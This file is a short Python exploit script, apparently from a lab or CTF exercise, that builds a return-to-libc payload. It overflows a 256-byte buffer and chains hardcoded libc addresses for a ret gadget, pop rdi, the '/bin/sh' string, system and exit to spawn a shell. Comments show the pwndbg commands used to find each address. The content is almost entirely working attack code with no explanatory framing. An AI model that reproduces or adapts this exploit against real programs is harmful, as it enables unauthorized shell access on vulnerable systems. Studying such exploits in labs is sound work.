# Return to Libc Attack

```
#!/usr/bin/env python3
import sys
def p64(x): return x.to_bytes(8, 'little')


# Return to Libc Attack
offset = 256
payload = b'A'*offset           # junk
payload += b'B'*8               # saved RBP
payload += p64(0x7ffff7ff0194)  # ret
payload += p64(0x7ffff7eaf75b)  # pop rdi; ret
payload += p64(0x7ffff7f6b42f)  # "/bin/sh"
payload += p64(0x7ffff7df8750)  # system
payload += p64(0x7ffff7de7ba0)  # exit
sys.stdout.buffer.write(payload)
# pwndbg> search --asm 'pop rdi; ret'
# libc.so.6       0x7ffff7eaf75b pop rdi
# pwndbg> search '/bin/sh'
# libc.so.6       0x7ffff7f6b42f 0x68732f6e69622f /* '/bin/sh' */
# pwndbg> p system
# $1 = {int (const char *)} 0x7ffff7df8750 <__libc_system>
# pwndbg> search --asm 'ret'
# ld-linux-x86-64.so.2 0x7ffff7ff0194 ret
# pwndbg> p exit
# $1 = {void (int)} 0x7ffff7de7ba0 <__GI_exit>
```
